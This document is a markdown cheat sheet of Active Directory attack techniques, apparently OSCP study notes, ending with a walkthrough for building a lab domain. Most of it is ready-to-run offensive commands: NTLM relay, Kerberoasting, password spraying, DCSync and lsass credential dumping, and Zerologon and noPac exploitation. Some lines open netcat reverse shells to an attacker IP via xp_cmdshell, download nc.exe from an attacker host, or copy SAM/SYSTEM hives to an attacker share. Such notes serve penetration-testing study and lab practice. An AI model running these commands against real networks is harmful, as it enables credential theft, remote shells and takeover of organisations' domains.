### :open_file_folder: Learning resources

https://www.hackingarticles.in/active-directory-pentesting-lab-setup/

https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA

https://tryhackme.com/room/breachingad

https://academy.hackthebox.com/module/details/143

https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet

a lot about the AD pentest explanations

https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ

AD mindmap <br>
https://orange-cyberdefense.github.io/ocd-mindmaps/ <br>
https://github.com/Orange-Cyberdefense/ocd-mindmaps

DACL abuse

https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/.gitbook/assets/DACL%20abuse.png

Security identifier (SID) and Relative identifier (RID) <br>
https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers

AD test environment

https://github.com/Orange-Cyberdefense/GOAD

Offensive PowerShell for red team

https://github.com/samratashok/nishang

### :open_file_folder: [Allowed Tools](https://help.offensive-security.com/hc/en-us/articles/4412170923924#h_01FP8CCWDT0GX03RCE6RGYRZT4)

Be sure to check the restrictions on the use of tools before taking the exam.

- BloodHound
- SharpHound
- PowerShell Empire
- Covenant 
- Powerview
- Rubeus
- evil-winrm
- Responder (Poisoning and Spoofing is not allowed in the labs or on the exam)
- Crackmapexec
- Mimikatz

```
WinRM HTTP port 5985, WinRM HTTPS port 5986
```

### :open_file_folder: Flow (WIP)

![AD drawio](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/AD.drawio.png)

### :open_file_folder: Commands And Tools

service scan, domain information, check for ```null sessions```, shares 

[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

```shell
enum4linux-ng -A <target ip> 
# -A all simple enumeration
```

Enumerating Users

add target domain /etc/hosts, if needed

```shell
127.0.0.1 localhost
<target domain ip> <Active Directory Domain>
```

NTLM relay attack

https://en.hackndo.com/ntlm-relay/ <br>
https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr

```shell
# listening
python3 ntlmrelayx.py --remove-mic --escalate-user <username> -t ldap://<attacker ip> -smb2support  
# launch
python3 PetitPotam.py -d <domain> -u <username> -p <password> <attacker ip> <target ip>
```

Dumping LDAP

```shell
ldapsearch -LLL -x -H ldap://<target ip> -b '' -s base '(objectclass=*)'
# with credential, e.g., domain = test.local
# pay attention to each user's information
ldapsearch -H ldap://<target ip> -x -W -D "<username>@test.local" -b "dc=<test>,dc=<local>"
# check the dump file's content, e.g., domain_users.json, the value of key "info"
ldapdomaindump -u '<domain>\<username>' -p '<password>' <HOSTNAME or target ip>
```

other LDAP queries tool

```shell
# https://github.com/ropnop/go-windapsearch
./windapsearch -d <domain> --dc <domain controller>
```

search smb vulnerability

```shell
nmap --script "safe or smb-enum-*" -p 445 <target ip>
```

Read gMSA password (```ReadGMSAPassword``` and ```AllowedToDelegate``` rights) (HTB BOX:Intelligence)

```shell
git clone https://github.com/micahvandeusen/gMSADumper.git
python3 gMSADumper.py -u <username> -p <password> -d <domain>
```

enumerate domain usernames

(Kerbrute)[https://github.com/ropnop/kerbrute/releases]

```shell
# 1 enumerate users 
kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> userenum  ~/Documents/userlist.txt
# 2 valid users
kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt | grep "USERNAME" | cut -f1 -d"@" | cut -f4 -d":" | tr -d "[:blank:]" > /tmp/users.txt
# bruteuser
./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <username>
# passwordspray
./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> passwordspray <userlist> '<password>'
# crackmapexec needs valid credential
crackmapexec smb <target ip> -u <username> -p <password> --users
```

change password (STATUS_PASSWORD_MUST_CHANGE)

```shell
smbpasswd -U <user_name> -r <target ip>
```

mount Windows shares

```shell
mount -t cifs //<target ip>/<folder> <attacker folder> -o username=<username>
```

get [SID](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getPac.py)

```shell
python3 getPac.py -targetUser <target username> <domain>/<username>[:password]
```

[Setspn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))

Windows command-line tool for enumerating SPNs, built in after windows server 2008

```powershell
# check all the SPN services 
setspn -Q */*
```

Enter-PSSession

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<username>", $password )
Enter-PSSession -ComputerName <computer_name> -Credential $cred
```

rubeus asreproast

```powershell
.\rubeus.exe asreproast

# modify hash insert $23 after $krb5asrep 
# $krb5asrep$23$......

.\hashcat.exe -a 0 -m 18200 .\hash .\Pass.txt
```

### :open_file_folder: BloodHound

:bangbang: [Edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html): relationship between nodes, direct of attack

https://github.com/ShutdownRepo/The-Hacker-Recipes/tree/master/ad/movement/dacl

```
AddMembers
Addself
ForceChangePassword
GenericAll
WriteDACL
GenericWrite
WriteOwner
AllExtendedRights
SQLAdmin
CanRDP
CanPSRemote
```

collecting data in Windows

```cmd
.\SharpHound.exe -c all --zipfilename ad_data
```

collecting data in Linux

```shell
# normal
python3 bloodhound.py -ns <nameserver ip> -d <domain> -c all -u <username> -p <password> --zip
# proxychains
proxychains python3 bloodhound.py -ns <nameserver ip> -d <domain> -c all -u <username> -p <password> --zip --dns-tcp
```

Cypher (Neo4j's query language) Query

[bloodhound-cypher-cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

```
# return nodes with direct relationships
MATCH c=(a)-[:CanPSRemote]->(b) RETURN c
# Find SPNs with keywords 
MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS '<search string>') RETURN u
# retrieve computers
MATCH (c:Computer) [WHERE c.operatingsystem CONTAINS "<search string>"] RETURN c
# PowerShell command:Test-Connection -ComputerName <ComputerName> -Count 1 | Select-Object -ExpandProperty IPV4Address
```

- GenericAll

[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)

```powershell
Import-Module .\PowerView.ps1
<# valid credential #>
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
<# fake SPN #>
Set-DomainObject -Credential $Cred -Identity <specific user> -SET @{serviceprincipalname='<service class>/<host>'} -Verbose
<# Kerberoasting #>
.\Rubeus.exe kerberoast /user:<specific user> /nowrap
<# password recovery #>
.\hashcat.exe -a 0 -m 13100 .\hash .\rockyou.txt
```

steps example

```powershell
$User = 'VITAMIN\Ted';$Pass = ConvertTo-SecureString 'P@ssword789' -AsPlainText -Force;$Cred = New-Object System.Management.Automation.PSCredential($User, $Pass)

Set-DomainObject -Credential $Cred -Identity administrator -SET @{serviceprincipalname='ANYNAME/test000'}

.\Rubeus.exe kerberoast /user:administrator /nowrap /creduser:VITAMIN\Ted /credpassword:'P@ssword789' /spn:"ANYNAME/test000"
```

if we can't recovery password

```powershell
$User = 'VITAMIN\Ted';$Pass = ConvertTo-SecureString 'P@ssword789' -AsPlainText -Force;$Cred = New-Object System.Management.Automation.PSCredential($User, $Pass)
<# change target user's password #>
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity administrator -AccountPassword $UserPassword -Credential $Cred
```

- ForceChangePassword

```powershell
# group member who has permission
Add-ADGroupMember "<groupname>" -Members "<ADAccount>" 
# checking user alreay in the group
Get-ADGroupMember -Identity "<groupname>"
# start to change password 
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<ADAccount>", $password )
# using same password to change target user's password
Set-ADAccountPassword -Identity "<Target ADAccount>" -Reset -NewPassword $password -Credential $cred
# if access denied, reconnect
gpupdate /force

# we can use Enter-PSSession to connect to target host
$cred = New-Object System.Management.Automation.PSCredential ("<Target ADAccount>", $password )
Enter-PSSession -ComputerName <computer_name> -Credential $cred
```

### :open_file_folder: PowerView

```powershell
Import-Module .\PowerView.ps1
# check if loading is successful
Get-Module
```

```powershell
# Groups
Get-NetGroup
```

```powershell
# Computers
Get-NetComputer -fulldata
# select
Get-NetComputer -fulldata | select operatingsystem
```

```powershell
# Users
Get-NetUser
# find AD users
Get-ADUser -Identity <AD account> -Server <domain controller> -Properties *
Get-ADUser -Filter * -Properties * | select Name, SamAccountName, Description
Get-DomainUser -Identity <AD account> -Properties MemberOf, objectsid
# password last set
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount
# GroupMembers
Get-ADGroupMember -Identity <groupname>
```

```powershell
# find some special messages in description
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
```

Kerberoasting 

get user TGS ticket

```powershell
Get-DomainUser -Identity <AD account> | Get-DomainSPNTicket -Format Hashcat
```

```shell
targetedKerberoast.py -d <domain> -u <username> -p <password> --dc-ip <dc ip>
# john /tmp/hashes --wordlist=rockyou.txt
# hashcat -m 13100 --force -a 0 hashes rockyou.txt   
```

### :open_file_folder: [CrackMapExec](https://mpgn.gitbook.io/crackmapexec/)

[Pwn3d!](https://mpgn.gitbook.io/crackmapexec/news-2022/major-release-for-crackmapexec#ldap-getting-the-pwn3d-flag-lets-go-deeper-with-ldap):domain admin flag

```shell
# brute forcing, server may block brute-force attack
sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <password_list.txt>
# testing user = password
sudo crackmapexec <protocol> <target ip> -u <user_list.txt> -p <user_list.txt> --no-bruteforce
# check password policy
sudo crackmapexec <protocol> <target ip> --pass-pol
# using existing credentials and users to find more credentials 
sudo crackmapexec <protocol> <target ip> -u /tmp/users.txt -p <password> --continue-on-success
# using low privilege user to enumerate more users
sudo crackmapexec <protocol> <target ip> -u <username> -p <password> --users
# using low privilege user to enumerate more groups
sudo crackmapexec <protocol> <target ip> -u <username> -p <password> --groups
# enumerate logged users on multiple servers
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --loggedon-users
# enumerate shares on multiple servers
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --shares
# list readable share files
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
# bruteforcing the RID
sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute
# using NTLM hash (NTDS.dit) to check credentials
# e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a:::
sudo crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
# sudo crackmapexec smb test.local -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a'
sudo crackmapexec smb <target ip(s)> -u <username> -H 'NTHASH'
# sudo crackmapexec smb test.local -u Administrator -H 'a8a3b1fee7718533175de682804c417a'

# anonymous access
sudo crackmapexec smb <target ip> -u 'anonymous' -p '' --shares   

# Zerologon
crackmapexec smb <target ip> -u <username> -p <password> -M zerologon
# PetitPotam
crackmapexec smb <target ip> -u <username> -p <password> -M petitpotam
# noPAC
crackmapexec smb <target ip> -u <username> -p <password> -M nopac
```

### :open_file_folder: [dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))

[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)

[userAccountControl](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)

[OID](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5?redirectedfrom=MSDN): LDAP Matching Rules

```powershell
# http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm
# userAccountControl:<LDAP_MATCHING_RULE OID>:=<flags (sum) value>
# inactive accounts (ACCOUNTDISABLE=2)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
```

### :open_file_folder: rpcclient

If ```null session``` is enabled on the network. Server may have null session vulnerability but unable to enumerate because of permission settings.

```shell
# null session
rpcclient -U "" -N <target ip>
# -U username
# -N no password

# If you cannot enumerate, you must provide a valid credentail 
rpcclient -U <username> --password <password> <target ip> 

rpcclient $> querydominfo
# Domain info
rpcclient $> lookupdomain <domain_name>
# Domain info (include SID)
rpcclient $> querydispinfo
# Query display info (include RID)
rpcclient $> queryuser <RID> or <username>
# Query domain user group 
rpcclient $> queryusergroups <RID>
# Enumerate domain users (include RID)
rpcclient $> enumdomusers
# Enumerate domain groups
rpcclient $> enumdomgroups
# Enumerate alias groups
rpcclient $> enumalsgroups <builtin> or <domain> 
# Enumerate domains
rpcclient $> enumdomains
# Enumerate privileges
rpcclient $> enumprivs
# Get domain password info
rpcclient $> getdompwinfo
# Get user domain password info
rpcclient $> getusrdompwinfo <RID> 
# Enumerate the LSA SIDs
rpcclient $> lsaenumsid
# Lookup SID
rpcclient $> lookupsids <SID>
# Enumerate SIDs privileges
rpcclient $> lsaenumacctrights <SID>
# Enumerate shares
rpcclient $> netshareenum
# Enumerate all shares
rpcclient $> netshareenumall
# Details of share
rpcclient $> netsharegetinfo <sharename>
# Lookup username to RID
rpcclient $> samlookupnames domain <username>
# Lookup RID to username
rpcclient $> samlookuprids domain <RID>
# Query LSA policy
rpcclient $> lsaquery
# Create a new user
rpcclient $> createdomuser <username>
# Set new user's password <level>:USER_INFORMATION_CLASS number e.g., 24 (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
rpcclient $> setuserinfo2 <username> <level> <password>
# installed and share printers
rpcclient $> enumprinters
```

### :open_file_folder: [Psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

[Microsoft PsExec Tool](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) (```ADMIN$```)

get interactive shell on the Windows host (```ADMIN$``` or ```C$``` must be writeable)

```shell
psexec.py <domain>/<username>:'<password>'@<target ip>
# example
psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.exe 192.168.9.123 4444" -c ~/Documents/nc.exe
# -c pathname copy the filename for later execution, arguments are passed in the command option
```

### :open_file_folder: [Krbrelayx](https://github.com/dirkjanm/krbrelayx)

```shell
# add AD Integrated DNS records
python3 dnstool.py -u '<domain>\<username>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
# get information in a few minutes 
responder -I tun0 # not allowed in the labs or on the exam
```

### :open_file_folder: Extracting

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py): extracting the password hash from ntds.dit

```shell
# 1
secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
# 2
impacket-secretsdump <username>:<password>@<domain or IP> -dc-ip <domain controller ip>
```

[getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py): get a Kerberos ticket and use it to access other services

```shell
# If in VirtualBox, disabling time synchronization between the virtual machine and the host.
sudo service virtualbox-guest-utils stop
# synchronize with server time
sudo ntpdate <target ip>
#
getTGT.py -hashes '<LMHASH:NTHASH>' <domain>/<username>
# Kerberos credentials cache
export KRB5CCNAME=<username>@<domain>.ccache
export KRB5CCNAME=<TGT_ccache_file>
# showing Kerberos credentials cache
klist
# login method1
python3 psexec.py -k -no-pass <target>
# login method2
wmiexec.py -k -no-pass <target>
```

[reg.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py): remote registry manipulation tool through the ```MS-RRP``` [(Windows Remote Registry Protocol)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)

```shell
reg.py <domain>/<valid username with domain> -hashes '<LMHASH:NTHASH>' query -keyName <Registry Root Keys>
# Registry Root Keys: HKCR, HKCU, HKLM, HKU, HKCC
```

- BACKUP OPERATORS

```shell
python smbserver.py -smb2support share /tmp

reg.py "<domain>"/"<backup_operator_username>":"<password>"@"<dc ip>" save -keyName 'HKLM\SAM' -o '\\<attacker ip>\share'
reg.py "<domain>"/"<backup_operator_username>":"<password>"@"<dc ip>" save -keyName 'HKLM\SYSTEM' -o '\\<attacker ip>\share'
reg.py "<domain>"/"<backup_operator_username>":"<password>"@"<dc ip>" save -keyName 'HKLM\SECURITY' -o '\\<attacker ip>\share'

secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
# find the string below
# $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9b5ccb9700e3ed723df08132357ff6a1
secretsdump.py <domain>/'<machine accounts>'@<dc ip> -hashes <LMHASH:NTHASH>
# e.g., secretsdump.py test.com/'DC01$'@192.168.0.100 -hashes :9b5ccb9700e3ed723df08132357ff6a1
```

If running `reg.py` times out, we can use the following executable, which needs to be compiled.

[BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

```shell
python smbserver.py -smb2support share /tmp
```
It requires some time.

```powershell
# Use the -h parameter to check if our compiled file is correct."
.\BackupOperatorToDA.exe -t \\<TARGET or dc> -u <username> -p <password> -d <domain> -o \\<attacker ip>\share
```

### :open_file_folder: Group Policy Preferences File (GPP cracking)

Groups.xml

```
gpp-decrypt <Groups.xml cpassword strings>
```

### :open_file_folder: Kerberoasting

service logon account with SPN services

```
# valid domain credentials
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain controller ip> 
```

```
python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain controller ip> -request -output <hashfile>
```

```
hashcat -a 0 -m 13100 <hashfile> ~/Documents/rockyou.txt       
```

### :open_file_folder: ASREPRoast

[GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)

```shell
python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -usersfile <userlist> -format hashcat -outputfile <hashes> -no-pass
# directly output
python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -usersfile <userlist> -format hashcat -no-pass
python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -format hashcat -outputfile <hashes>
# hashcat -> 18200
```

### :open_file_folder: [impacket smbclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py)

different from the smb tool smbclient

```shell
python3 getTGT.py <domain>/<username>:<password> -k -dc-ip <domain controller ip>
# -k: use Kerberos authentication.
```

```shell
export KRB5CCNAME=<username>.ccache
```

```shell
python3 smbclient.py -no-pass -k <domain>/<username>@<targetName or ip>
```

### impacket other services

:label: MSSQL

```shell
python3 mssqlclient.py [[domain/]username[:password]@]<targetName or ip> -k -no-pass
# -k -no-pass: use the credentials in the ccache file for Kerberos authentication
```

have permission

```mssql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE

EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE

EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port>';
```

### :open_file_folder: Mimikatz

[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md<br>
https://github.com/gentilkiwi/mimikatz



```
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

- UAC-bypass

If we are already in the administrators group but are unable to execute Mimikatz.

```
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 non admin
```

https://github.com/k4sth4/UAC-bypass

- DCSync

```powershell
.\mimikatz.exe
privilege::debug
<# already a domain administrator #> 
lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user>
<# authuser with Replicating Directory Changes and Replicating Directory Changes All permissions #>
lsadump::dcsync /domain:<domain> /dc:<domain controller> /user:<specific user> /authuser:<authuser> /authdomain:<authdomain> /authpassword:<authpassword> /authntlm
<# e.g., lsadump::dcsync /domain:TEST.LOCAL /user:user01 /authuser:vitamin /authdomain:TEST /authpassword:"eRFWE5756872Gn" /authntlm #>
```

- Exporting AD member hashes

```cmd
REM create a snapshot
ntdsutil snapshot "activate instance ntds" create quit quit
REM mount a snapshot
ntdsutil "activate instance ntds" snapshot "mount {GUID}" quit quit
REM copy file
copy C:\$SNAP_{X}_VOLUMEC$\windows\NTDS\ntds.dit c:\users\administrator\desktop\ntds.dit
```

download ntds.dit to our pc

```shell
secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
```

- Dumping tickets

```
sekurlsa::tickets
```

- Dumping credentials from lsass

```cmd
.\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

- Pass the Hash

We can also reuse the same hash.

```shell
impacket-psexec "Administrator":@10.10.10.10 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
# reuse
impacket-psexec "Administrator":@10.10.10.11 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
```

### :open_file_folder: Vulnerabilities

- [sAMAccountName spoofing (NoPac) CVE-2021-42278 & CVE-2021-42287](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/samaccountname-spoofing.md)

```
git clone https://github.com/Ridter/noPac.git
```

```shell
sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <domain controller> -use-ldap
```

method1 interactive shell

```shell
# Use the full path to get files
sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> -dc-host <hostname> -shell --impersonate administrator -use-ldap
```

method2 using TGT_ccache_file

```shell
# specify the new username and password with administrator permission
sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> -dc-host <hostname> --impersonate administrator -use-ldap -target-name 'admin01' -new-pass 'Welcome123@'
# using cache file
export KRB5CCNAME=<TGT_ccache_file>
# showing Kerberos credentials cache
klist
# login method1
python3 psexec.py -k -no-pass <target>
# login method2
wmiexec.py -k -no-pass <target ip or FQDN> 
```

- [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)

### :open_file_folder: Remote Tools

[![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)

[winrs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)

```cmd
winrs -R:<host> -u:<username> -p:<password> cmd
```

### :open_file_folder: Pivoting with chisel & proxychains

[reference](https://www.youtube.com/watch?v=dIqoULXmhXg&t=714s)

attacker

```shell
# ./chisel server -p 80 --reverse -v
./chisel server -p <attacker port> --reverse -v
```

target

Windows

```powershell
.\chisel.exe client <attacker ip>:<attacker port> R:socks
```

Linux

```shell
# transport target service on port 1234 to our pc(192.168.10.100) port 5678
# ./chisel client 192.168.10.100:80 R:5678:localhost:1234
# nmap -sC -sV -p5678 192.168.10.100 -Pn
./chisel client <attacker ip>:<attacker port> R:<attacker service port>:localhost:<target service port>
```

using proxychains 

```shell
cat /etc/proxychains4.conf
# using socks5
# #socks4         127.0.0.1 9050
# socks5  127.0.0.1 1080

proxychains evil-winrm -i '<target ip>' -u '<username>'
proxychains impacket-psexec "<username>":'<password>'@<target ip>
# certutil -urlcache -split -f "<remote_file_path>" "<local_file_path>"
# certutil -urlcache -split -f "http://<attacker ip>/nc.exe" "C:\Users\<username>\Desktop\nc.exe"
```

additional use

port forwarding to access MySQL

```mysql
/* attacker */
./chisel server -p 4547 --reverse -v
/* target */
.\chisel.exe client 192.168.10.100:4547 R:4748:localhost:3306

/* MySQL */
mysql -h 127.0.0.1 -u root -p '' -P 4748
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') AS Result;
SELECT LOAD_FILE('C:\\Users\\Public\\Documents\\poc.dll') INTO DUMPFILE "C:\\Windows\\System32\\poc.dll";
```

### :open_file_folder: MSSQL

[Extract hash from MDF](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)

```shell
john --format=mssql12 --wordlist=<rockyou.txt> hash
```

```mssql
/* python3 mssqlclient.py [[domain/]username[:password]@]<targetName or ip> */
/* sysadmin fixed server role */
enable_xp_cmdshell
xp_cmdshell "powershell.exe wget http://<attacker ip>/nc.exe -OutFile c:\\Users\Public\\nc.exe"
xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe <attacker ip> <attacker port>"
```

### :open_file_folder: Zerologon

https://github.com/VoidSec/CVE-2020-1472

```shell
./cve-2020-1472-exploit.py -n <DC_NAME> -t <dc-ip>
# [+] Success: Target is vulnerable!                                                                                                         
# [-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y 
# y
# [+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.
python secretsdump.py -no-pass -just-dc <domain>/'DC_NETBIOS_NAME$'@<dc-ip>
# e.g., python secretsdump.py -no-pass -just-dc test.local/'USER01$'@10.10.10.168
# remote login
impacket-psexec "<username>":@<target ip> -hashes "<NTLM hash>"
# default 5989 port
evil-winrm -i <target ip> -u <username> -H '<NTLM hash>'
```

### :open_file_folder: AD Recycle Bin

find hidden information

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

### :open_file_folder: tool debug

ticket_converter.py (convert ticket to UNIX <-> Windows format)

modify KeyBlock to KeyBlockV4

```
ImportError: cannot import name 'KeyBlock' from 'impacket.krb5.ccache'
```

Mimikatz

Try using an older version.

```
sekurlsa::logonpasswords
mimikatz # ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
```

Try using the latest version.

```
mimikatz # ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
```

### :open_file_folder: Test Environment

First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.

```
https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022#Get-started
```

Use the previously downloaded VHD file to create a virtual machine.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step1.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step2.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step3.png)

After creating the virtual machine, switch the network to bridged.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step4.png)


Install the AD service.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step5.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step6.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step7.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step8.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step9.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step10.png)


Create domain control.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step11.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step12.png)

Add a new forest.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step13.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step14.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step15.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step16.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step17.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step18.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step19.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step20.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step21.png)

Create a user account.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step22.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step23.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step24.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/step25.png)

The AD server and user account are ready. Next we create a clinet pc environment. We can download the ISO file and use it to create virtual machine.

```
https://www.microsoft.com/en-us/software-download/windows11
```

Remembering to switch client virtual machine's network to bridged too. You can also test whether the connection between client to AD server is work.

Setting up DNS server in our client pc. The DNS server is the same as the AD server.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step1.png)

Now we can join the domain. (If you get an error when you join, try disabling IPv6.)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step2.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step3.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step4.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step5.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step6.png)

Disabling IPv6.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step7.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/client_step8.png)
